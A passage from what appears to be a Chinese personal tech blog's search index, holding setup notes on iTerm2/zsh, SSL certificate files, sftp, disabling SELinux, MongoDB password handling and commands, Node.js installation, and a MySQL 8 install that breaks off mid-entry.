class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure><p>在文件最后一行加入</p><p><code>source ~/.oh-my-zsh/custom/plugins/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh</code></p><p>在文件的plugins最后一个加入</p><figure class="highlight ebnf"><table><tr><td class="code"><pre><span class="line"><span class="attribute">zsh-syntax-highlighting</span></span><br></pre></td></tr></table></figure><p>隐藏iTerm2 的用户名和主机名</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">vi ~/.zshrc</span><br></pre></td></tr></table></figure><p>在最上面增加一行:(引号里面一定要是你的用户名)</p><figure class="highlight ini"><table><tr><td class="code"><pre><span class="line"><span class="attr">DEFAULT_USER</span>=<span class="string">&quot;anthony&quot;</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> MacOs </category>
          
          <category> Software </category>
          
          <category> iTerm2安装及优化 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> MacOs </tag>
            
            <tag> 安装 </tag>
            
            <tag> Software </tag>
            
            <tag> iTerm2 </tag>
            
            <tag> 优化 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSL证书</title>
      <link href="/SSL%E8%AF%81%E4%B9%A6.htm"/>
      <url>/SSL%E8%AF%81%E4%B9%A6.htm</url>
      
        <content type="html"><![CDATA[<h1 id="SSL证书"><a href="#SSL证书" class="headerlink" title="SSL证书"></a>SSL证书</h1><h3 id="PEM和KEY"><a href="#PEM和KEY" class="headerlink" title="PEM和KEY"></a>PEM和KEY</h3><p>PEM包含两个</p><p>一个是服务商给你颁发的SSL证书代码</p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">OUR SSL CERTIFICATE</span></span><br><span class="line"><span class="comment">\</span><span class="literal">--------------------------------------------------</span></span><br><span class="line"><span class="comment">(Formatted for the majority of web server software including IIS and Apache</span></span><br><span class="line"><span class="comment">based servers):</span></span><br><span class="line"><span class="literal">-----</span><span class="comment">BEGIN CERTIFICATE</span><span class="literal">-----</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="literal">-----</span><span class="comment">END CERTIFICATE</span><span class="literal">-----</span></span><br></pre></td></tr></table></figure><p>另外一个是SSL中级证书代码</p><p>在服务商里面找</p><p><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20201227105126245.png" alt="image-20201227105126245"></p><figure class="highlight brainfuck"><table><tr><td class="code"><pre><span class="line"><span class="comment">合在一起就是</span></span><br><span class="line"><span class="literal">-----</span><span class="comment">BEGIN CERTIFICATE</span><span class="literal">-----</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXX自己证书XXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="literal">-----</span><span class="comment">END CERTIFICATE</span><span class="literal">-----</span></span><br><span class="line"> </span><br><span class="line"><span class="literal">-----</span><span class="comment">BEGIN CERTIFICATE</span><span class="literal">-----</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXX中级证书XXXXXXXX</span></span><br><span class="line"><span class="comment">XXXXXXXXXXXXXXXXXXXXX</span></span><br><span class="line"><span class="literal">-----</span><span class="comment">END CERTIFICATE</span><span class="literal">-----</span></span><br></pre></td></tr></table></figure><p>KEY是CSR生成的第二个私钥<br><img src="https://pic-1257960926.cos.ap-guangzhou.myqcloud.com/blog/image-20201227105247695.png" alt="image-20201227105247695"></p><h3 id="CSR和KEY和CRT"><a href="#CSR和KEY和CRT" class="headerlink" title="CSR和KEY和CRT"></a>CSR和KEY和CRT</h3><p>CSR是CSR生成的第一个</p><p>KEY是CSR生成的第二个</p><p>CRT是服务商颁发给你的SSL证书代码加上服务商的SSL中级证书代码</p>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
          <category> Key </category>
          
          <category> SSL </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Service </tag>
            
            <tag> Web </tag>
            
            <tag> SSL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7_Sftp</title>
      <link href="/sftp.htm"/>
      <url>/sftp.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Linux-sftp服务使用"><a href="#Linux-sftp服务使用" class="headerlink" title="Linux sftp服务使用"></a>Linux sftp服务使用</h1><p> sftp  -i xx.pem -P 12345 <a href="mailto:root@xxx.com">root@xxx.com</a></p><p>上传sftp服务器上某个文件夹到目录中</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">put <span class="regexp">/xxx.zip /</span>root</span><br></pre></td></tr></table></figure><p>下载sftp服务器上某个文件夹到目录中</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">get <span class="regexp">/xxx.zip /</span>root</span><br></pre></td></tr></table></figure><p>如果是上传文件夹 或者下载文件夹 使用 -r</p>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Service </category>
          
          <category> Sftp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Service </tag>
            
            <tag> Sftp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>centos7_basetoolset</title>
      <link href="/centos7-basetoolset.htm"/>
      <url>/centos7-basetoolset.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Centos7-Setting"><a href="#Centos7-Setting" class="headerlink" title="Centos7_Setting"></a>Centos7_Setting</h1><p><strong>关闭selinux</strong></p><p>1、通过命令“getenforce”获取selinux状态，</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">getenforce</span><br><span class="line"><span class="regexp">//</span>enforceing代表开启</span><br><span class="line"><span class="regexp">//</span>permissive代表警告</span><br><span class="line"><span class="regexp">//</span>disabled代表关闭</span><br></pre></td></tr></table></figure><p>2、在终端输入命令即可关闭selinux，此种做法只是暂时关闭，重启之后没有效果</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">setenforce <span class="number">0</span>  <span class="regexp">//</span>关闭</span><br><span class="line">setenforce <span class="number">1</span>  <span class="regexp">//</span>开启</span><br></pre></td></tr></table></figure><p>3、通过配置文件“/etc/sysconfig/selinux”来修改selinux状态，此种做法需要重启机器</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">vi /etc/sysconfig/selinux</span><br><span class="line"><span class="comment"># This file controls the state of SELinux on the system.</span></span><br><span class="line"><span class="comment"># SELINUX= can take one of these three values:</span></span><br><span class="line"><span class="comment">#     enforcing - SELinux security policy is enforced.</span></span><br><span class="line"><span class="comment">#     permissive - SELinux prints warnings instead of enforcing.</span></span><br><span class="line"><span class="comment">#     disabled - No SELinux policy is loaded.</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">SELINUX</span>=disabled</span><br></pre></td></tr></table></figure><p>4、通过修改“/boot/grub/menu.lst”来关闭selinux，这样每次开机都不会启动selinux</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">vi /boot/grub/menu.lst </span><br><span class="line">---------------------------------</span><br><span class="line"><span class="attribute">default</span>=0</span><br><span class="line"></span><br><span class="line"><span class="attribute">timeout</span>=5</span><br><span class="line"></span><br><span class="line">splashimage=(hd0,0)/grub/splash.xpm.gz</span><br><span class="line"></span><br><span class="line">hiddenmenu</span><br><span class="line"></span><br><span class="line">title CentOS (2.6.32-431.el6.i686)</span><br><span class="line"></span><br><span class="line">        root (hd0,0)</span><br><span class="line"></span><br><span class="line">        kernel /vmlinuz-2.6.32-431.el6.i686 ro <span class="attribute">root</span>=/dev/mapper/VolGroup-lv_root nomodeset rd_NO_LUKS rd_NO_MD <span class="attribute">rd_LVM_LV</span>=VolGroup/lv_swap <span class="attribute">crashkernel</span>=auto <span class="attribute">vga</span>=ask <span class="attribute">LANG</span>=zh_CN.UTF-8 <span class="attribute">rd_LVM_LV</span>=VolGroup/lv_root <span class="attribute">KEYBOARDTYPE</span>=pc <span class="attribute">KEYTABLE</span>=us rd_NO_DM rhgb quiet <span class="attribute">selinux</span>=0</span><br><span class="line"></span><br><span class="line">        initrd /initramfs-2.6.32-431.el6.i686.img</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Setting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Setting </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB密码特殊字符的解决方法</title>
      <link href="/mongodb%E5%AF%86%E7%A0%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.htm"/>
      <url>/mongodb%E5%AF%86%E7%A0%81%E7%89%B9%E6%AE%8A%E5%AD%97%E7%AC%A6%E7%9A%84%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95.htm</url>
      
        <content type="html"><![CDATA[<h1 id="mongodb密码特殊字符的解决方法"><a href="#mongodb密码特殊字符的解决方法" class="headerlink" title="mongodb密码特殊字符的解决方法"></a>mongodb密码特殊字符的解决方法</h1><p>一般情况是这样连接的:</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mongoClient.<span class="title function_ invoke__">connect</span>(<span class="string">&quot;mongodb://username:password@127.X.X.X:27017/db&quot;</span>,&#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span> ,<span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;)</span><br></pre></td></tr></table></figure><p>但是,如果你的密码里面设置了特殊字符,比如‘@’,‘%’,可能使得 mongodb 连接不能被正常解析,字符转义也没什么效果,从而导致连接失败.</p><h4 id="解决方法如下"><a href="#解决方法如下" class="headerlink" title="解决方法如下:"></a>解决方法如下:</h4><ol><li><p>更换连接格式</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mongoose.<span class="title function_ invoke__">connect</span>(</span><br><span class="line"><span class="string">&quot;mongodb://username:password@127.X.X.X:27017/db&quot;</span>,</span><br><span class="line">&#123;<span class="attr">user</span>: <span class="string">&#x27;username&#x27;</span>, <span class="attr">pass</span>: <span class="string">&#x27;password&#x27;</span>,<span class="attr">useNewUrlParser</span>: <span class="literal">true</span> ,<span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li><li><p>开启 uri_decode_auth 功能,uri_decode_auth 在 driver 内部 decode连接串</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">mongoose.<span class="title function_ invoke__">connect</span>(</span><br><span class="line"><span class="string">&quot;mongodb://username:password@127.X.X.X:27017/db&quot;</span>, </span><br><span class="line">&#123;</span><br><span class="line">  <span class="attr">uri_decode_auth</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">useNewUrlParser</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">useUnifiedTopology</span>: <span class="literal">true</span></span><br><span class="line">  &#125;,</span><br><span class="line">   function(err, db) &#123;&#125;</span><br><span class="line">);</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> MongoDB客户端连接密码特殊字符的解决方法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MongoDB Server </tag>
            
            <tag> Centos 7 </tag>
            
            <tag> 密码特殊字符的解决方法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB重置密码</title>
      <link href="/MongoDB%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81.htm"/>
      <url>/MongoDB%E5%BF%98%E8%AE%B0%E5%AF%86%E7%A0%81.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB忘记管理员密码解决方法"><a href="#MongoDB忘记管理员密码解决方法" class="headerlink" title="MongoDB忘记管理员密码解决方法"></a>MongoDB忘记管理员密码解决方法</h1><ol><li><p>关闭Mongodb进程</p><figure class="highlight nginx"><table><tr><td class="code"><pre><span class="line"><span class="attribute">ps</span> -ef <span class="comment">#查看mongodb进程</span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">kill</span> (pid)</span><br></pre></td></tr></table></figure></li><li><p>非auth验证方法启动mongo</p><figure class="highlight dsconfig"><table><tr><td class="code"><pre><span class="line"><span class="string">mongod</span> <span class="built_in">--dbpath</span> <span class="string">&quot;/root/db/&quot;</span> <span class="built_in">--logpath</span> <span class="string">&quot;/root/db/log&quot;</span> -<span class="string">logappend</span> <span class="built_in">--fork</span></span><br><span class="line"><span class="comment">#dbpath和logpath替换成自己的目录</span></span><br></pre></td></tr></table></figure></li><li><p>进入admin的数据库</p><figure class="highlight actionscript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">use</span> admin</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">db.users.<span class="built_in">find</span>(&#123;&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">db.users.<span class="built_in">remove</span>(&#123;user:<span class="string">&quot;user&quot;</span>&#125;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="comment">#重新创建用户</span></span><br><span class="line">db.<span class="title function_ invoke__">createUser</span>(&#123;<span class="attr">user</span>: <span class="string">&quot;用户名&quot;</span>,<span class="attr">pwd</span>: <span class="string">&quot;密码&quot;</span>,<span class="attr">roles</span>:[&#123; <span class="attr">role</span>:<span class="string">&quot;userAdminAnyDatabase&quot;</span>,<span class="attr">db</span>:<span class="string">&quot;admin&quot;</span>&#125;] &#125;);</span><br><span class="line"><span class="comment">#认证方法db.auth(&quot;用户名&quot;,&quot;密码&quot;)</span></span><br><span class="line">db.<span class="title function_ invoke__">updateUser</span>(<span class="string">&quot;用户名&quot;</span>, &#123;</span><br><span class="line">    <span class="attr">roles</span>: [&#123;</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;userAdminAnyDatabase&quot;</span>,</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;dbOwner&quot;</span>,</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;,</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="string">&quot;role&quot;</span>: <span class="string">&quot;clusterAdmin&quot;</span>,</span><br><span class="line">        <span class="string">&quot;db&quot;</span>: <span class="string">&quot;admin&quot;</span></span><br><span class="line">    &#125;]</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>关闭mongodb</p><figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line">db.<span class="keyword">shutdown</span>Server<span class="params">()</span> </span><br></pre></td></tr></table></figure></li><li><p>以auth方式启动mongo</p><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="regexp">/mongodb/</span>bin<span class="regexp">/mongod --fork --dbpath &quot;/</span>root<span class="regexp">/db/</span><span class="string">&quot; --logpath &quot;</span><span class="regexp">/root/</span>db/log<span class="string">&quot; --bind_ip_all --port 12345</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> MongoDB 重置密码 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MongoDB Server </tag>
            
            <tag> 重置密码 </tag>
            
            <tag> Centos 7 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MongoDB的命令详解</title>
      <link href="/MongoDB%E6%8C%87%E4%BB%A4.htm"/>
      <url>/MongoDB%E6%8C%87%E4%BB%A4.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MongoDB指令"><a href="#MongoDB指令" class="headerlink" title="MongoDB指令"></a>MongoDB指令</h1><ol><li><p>清屏</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">cls<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>查看数据库<br>查看当前使用数据库名称</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">show dbs;</span><br><span class="line">db;</span><br></pre></td></tr></table></figure></li><li><p>查看集合</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">show collections<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>进入某个集合</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">use (collections)<span class="comment">;</span></span><br></pre></td></tr></table></figure></li><li><p>查询集合中的数据<br>查询某个数据库用户</p><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">db.(collections).<span class="built_in">find</span>(&#123;条件&#125;);</span><br><span class="line">db.users.<span class="built_in">find</span>();</span><br></pre></td></tr></table></figure></li><li><p>添加数据</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">db.(collections)<span class="selector-class">.save</span>(&#123;对象&#125;)</span><br><span class="line">#也可用于更新于已存在的集合，但是不推荐</span><br><span class="line">db.(collections)<span class="selector-class">.save</span>(&#123;_id:&quot;已存在的id&quot;,对象&#125;)</span><br><span class="line">#这种插入_id唯一</span><br><span class="line">db.(collections)<span class="selector-class">.insert</span>(&#123;对象&#125;)</span><br></pre></td></tr></table></figure></li><li><p>更新数据</p><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">db.(collections).update(&#123;需要修改对象&#125;,&#123;对象修改的内容&#125;,&#123;upsert,multi,writeConcern&#125;)</span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">需要修改的对象 可以用模糊匹配</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">对象修改的内容 如果默认写入对象则覆盖原对象,如果需要增添或者修改则使用&#123;<span class="variable">$set</span> : &#123;对象修改的内容&#125;&#125;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">upsert : 可选，这个参数的意思是，如果不存在update的记录，是否插入objNew,<span class="literal">true</span>为插入，默认是<span class="literal">false</span>，不插入。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">multi : 可选，mongodb 默认是<span class="literal">false</span>,只更新找到的第一条记录，如果这个参数为<span class="literal">true</span>,就把按条件查出来多条记录全部更新。</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">#</span><span class="language-bash">writeConcern :可选，抛出异常的级别。</span></span><br></pre></td></tr></table></figure></li><li><p>删除数据</p><figure class="highlight gcode"><table><tr><td class="code"><pre><span class="line">db.<span class="comment">(collections)</span>.remove<span class="comment">(&#123;删除的对象&#125;)</span></span><br></pre></td></tr></table></figure></li><li><p>聚合函数</p><p>需求当前集合的记录数</p><figure class="highlight scss"><table><tr><td class="code"><pre><span class="line">db.(collections)<span class="selector-class">.find</span>()<span class="selector-class">.count</span>();</span><br></pre></td></tr></table></figure><p>求最大值</p><p>求整个集合的总成绩</p><figure class="highlight handlebars"><table><tr><td class="code"><pre><span class="line"><span class="language-xml">db.(collections).aggregate(</span><span class="template-variable">&#123;&#123;<span class="name">_id:</span><span class="string">&#x27;1&#x27;</span>,sumscore:&#123;$sum:<span class="string">&#x27;$score&#x27;</span>&#125;&#125;</span><span class="language-xml">&#125;)</span></span><br><span class="line"><span class="language-xml">#_id一定作为分组名</span></span><br><span class="line"><span class="language-xml">#$avg</span></span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> 命令 </category>
          
          <category> 使用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Services </tag>
            
            <tag> MongoDB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs环境配置</title>
      <link href="/Nodejs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.htm"/>
      <url>/Nodejs%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE.htm</url>
      
        <content type="html"><![CDATA[<h1 id="Node-js安装"><a href="#Node-js安装" class="headerlink" title="Node.js安装"></a>Node.js安装</h1><h3 id="下载可执行文件"><a href="#下载可执行文件" class="headerlink" title="下载可执行文件"></a>下载可执行文件</h3><figure class="highlight crmsh"><table><tr><td class="code"><pre><span class="line">https://nodejs.org/en/download/</span><br><span class="line">wget https://nodejs.org/dist/v14.<span class="number">17.3</span>/<span class="keyword">node</span><span class="title">-v14</span>.<span class="number">17.3</span>-linux-x64.tar.xz</span><br><span class="line">tar -xvf <span class="keyword">node</span><span class="title">-v14</span>.<span class="number">17.3</span>-linux-x64.tar.xz</span><br><span class="line">mv <span class="keyword">node</span><span class="title">-v14</span>.<span class="number">17.3</span>-linux-x64 /nodejs</span><br></pre></td></tr></table></figure><h4 id="配置环境"><a href="#配置环境" class="headerlink" title="配置环境"></a>配置环境</h4><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">vi /etc<span class="built_in">/profile</span></span><br><span class="line"><span class="built_in"></span><span class="built_in">export</span> <span class="attribute">NODE_HOME</span>=/nodejs/bin</span><br><span class="line"><span class="built_in">export</span> <span class="attribute">PATH</span>=<span class="variable">$NODE_HOME</span>:$PATH</span><br><span class="line"></span><br><span class="line">source /etc/profile</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> Nodejs </category>
          
          <category> 安装 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Service </tag>
            
            <tag> 安装 </tag>
            
            <tag> Nodejs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Nodejs操作MongoDB</title>
      <link href="/Nodejs%E6%93%8D%E4%BD%9CMongoDB.htm"/>
      <url>/Nodejs%E6%93%8D%E4%BD%9CMongoDB.htm</url>
      
        <content type="html"><![CDATA[<h2 id="连接数据库-普通方法"><a href="#连接数据库-普通方法" class="headerlink" title="连接数据库(普通方法)"></a>连接数据库(普通方法)</h2><ol><li><p>引用模块和url</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> <span class="title class_">MongoClient</span> = <span class="built_in">require</span>(<span class="string">&#x27;mongodb&#x27;</span>).<span class="property">MongoClient</span></span><br><span class="line"><span class="keyword">const</span> mongourl = <span class="string">&quot;mongodb://用户名:密码@ip:端口/数据库名&quot;</span></span><br></pre></td></tr></table></figure><p>&lt; !–more–&gt;</p></li><li><p>连接数据库</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">MongoClient</span>.<span class="title function_">connect</span>(mongourl,&#123;<span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;,<span class="function">(<span class="params">err,db</span>)=&gt;</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(err) <span class="keyword">throw</span> err;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(连接<span class="variable constant_">OK</span>)</span><br><span class="line">    db.<span class="title function_">close</span>();</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="连接数据库-Mongoose"><a href="#连接数据库-Mongoose" class="headerlink" title="连接数据库(Mongoose)"></a>连接数据库(Mongoose)</h2><ol><li><p>引用模块和url</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">const</span> mongoose = <span class="built_in">require</span>(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line"><span class="keyword">const</span> mongourl = <span class="string">&quot;mongodb://用户名:密码@ip:端口/数据库名&quot;</span></span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li><p>连接数据库</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">mongoose.<span class="title function_">connect</span>(mongourl,&#123; <span class="attr">useNewUrlParser</span>: <span class="literal">true</span> ,<span class="attr">useUnifiedTopology</span>: <span class="literal">true</span>&#125;,<span class="function">(<span class="params">err,db</span>)=&gt;</span>&#123;</span><br><span class="line">    </span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><h2 id="Schema操作"><a href="#Schema操作" class="headerlink" title="Schema操作"></a>Schema操作</h2><ol><li><p>建立Schema</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> <span class="title class_">DataSchema</span> = mongoose.<span class="title class_">Schema</span>(&#123;</span><br><span class="line">    <span class="attr">name</span>:<span class="title class_">String</span>,</span><br><span class="line">    <span class="attr">age</span>:<span class="title class_">Number</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure></li></ol><ol start="2"><li></li></ol>]]></content>
      
      
      <categories>
          
          <category> Linux </category>
          
          <category> MongoDB </category>
          
          <category> 基本操作 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> MongoDB </tag>
            
            <tag> Nodejs </tag>
            
            <tag> 基本操作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Centos7编译安装mysql8.0和日常命令</title>
      <link href="/Mysql%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85.htm"/>
      <url>/Mysql%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85.htm</url>
      
        <content type="html"><![CDATA[<h1 id="MysqlRPM安装"><a href="#MysqlRPM安装" class="headerlink" title="MysqlRPM安装"></a>MysqlRPM安装</h1><p>下载RPM包</p><figure class="highlight pgsql"><table><tr><td class="code"><pre><span class="line">cd /usr/<span class="keyword">local</span>/</span><br><span class="line">mkdir mysql</span><br><span class="line">//下载RPM Bundle</span><br><span class="line">wget https://dev.mysql.com/<span class="keyword">get</span>/Downloads/MySQL<span class="number">-8.0</span>/mysql<span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm-bundle.tar</span><br><span class="line">tar -xvf mysql<span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm-bundle.tar</span><br><span class="line">//卸载Mariadb</span><br><span class="line">rpm -qa | grep mariadb</span><br><span class="line">//mariadb-libs<span class="number">-5.5</span><span class="number">.68</span><span class="number">-1.</span>el7.x86_64</span><br><span class="line">rpm -e mariadb-libs<span class="number">-5.5</span><span class="number">.68</span><span class="number">-1.</span>el7.x86_64 <span class="comment">--nodeps</span></span><br><span class="line">//依次安装common libs client <span class="keyword">server</span></span><br><span class="line">rpm -ivh mysql-community-common<span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm <span class="comment">--nodeps --force</span></span><br><span class="line">rpm -ivh mysql-community-libs<span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm <span class="comment">--nodeps --force</span></span><br><span class="line">rpm -ivh mysql-community-client<span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm <span class="comment">--nodeps --force</span></span><br><span class="line">rpm -ivh mysql-community-<span class="keyword">server</span><span class="number">-8.0</span><span class="number">.22</span><span class="number">-1.</span>el7.x86_64.rpm <span class="comment">--nodeps --force</span></span><br><span class="line">rpm -qa | grep mysql</span><br><span class="line">//mysql初始化</span><br><span class="line">mysqld <span class="comment">--initialize;</span></span><br><span class="line">chown mysql:mysql /var/lib/mysql -R;</span><br><span class="line">systemctl <span class="keyword">start</span> mysqld.service;</span><br><span class="line">systemctl <span class="keyword">enable</span> mysqld;</span><br><span class="line">//查看数据库密码</span><br><span class="line">cat /var/<span class="keyword">log</span>/mysqld.<span class="keyword">log</span> | grep <span class="keyword">password</span></span><br><span class="line">//改root密码</span><br><span class="line">mysql -uroot -p</span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;newpassword&#x27;</span>;</span><br><span class="line"><span class="keyword">select</span> host, <span class="keyword">user</span>, authentication_string, plugin <span class="keyword">from</span> <span class="keyword">user</span>;</span><br><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;wuhaodong&#x27;</span>@<span class="string">&#x27;%&#x27;</span> identified <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="keyword">grant</span> <span class="keyword">all</span> <span class="keyword">privileges</span> <span class="keyword">on</span> *.* <span class="keyword">to</span> <span class="string">&#x27;wuhaodong&#x27;</span>@<span class="string">&#x27;%&#x27;</span> <span class="keyword">with</span> <span class="keyword">grant</span> <span class="keyword">option</span>;</span><br></pre></td></tr></table></figure><h1 id="Mysql编译安装"><a href="#Mysql编译安装" class="headerlink" title="Mysql编译安装"></a>Mysql编译安装</h1><h5 id="下载编译包"><a href="#下载编译包" class="headerlink" title="下载编译包"></a>下载编译包</h5><figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>dev.mysql.com<span class="regexp">/get/</span>Downloads<span class="regexp">/MySQL-8.0/my</span>sql-<span class="number">8.0</span>.<span class="number">22</span>-el7-x86_64.tar</span><br><span class="line"><span class="regexp">//</span>官网https:<span class="regexp">//</span>dev.mysql.com<span class="regexp">/downloads/my</span>sql/</span><br><span class="line">tar -xvf mysql-<span class="number">8.0</span>.<span class="number">22</span>-el7-x86_64.tar</span><br><span class="line"><span 